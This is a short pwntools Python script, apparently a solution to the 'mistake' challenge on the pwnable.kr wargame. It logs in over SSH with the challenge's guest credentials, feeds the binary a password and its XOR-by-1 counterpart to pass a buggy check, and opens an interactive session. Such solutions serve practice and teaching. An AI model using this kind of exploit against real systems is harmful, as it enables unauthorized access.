from pwn import *
char = 'b'
xorchar = chr(ord('b') ^ 1)
s = ssh(host='pwnable.kr', port=2222, user='mistake', password='guest')
p = s.process('./mistake');
p.writeline((char * 10).encode('ascii'))
p.writeline((xorchar * 10).encode('ascii'))
p.interactive()
